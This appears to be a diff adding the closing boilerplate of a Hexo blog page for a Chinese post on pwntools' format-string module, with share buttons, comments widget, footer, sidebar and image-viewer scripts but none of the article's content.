+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://lzeroyuee.cn/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" rel="tag">二进制安全</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/02/27/Linux-Pwn-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Linux Pwn - 整数溢出与格式化字符串漏洞</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "sJHHqdejjKH1GtEKzxEL80y2-gzGzoHsz",
+    app_key: "oPkDhBajzB1AvNe4r6CxTfU0",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> lzeroyuee
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/my.png" alt="lzeroyuee&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/my.png">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/my.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+  </div>
+</body>
+
+</html>
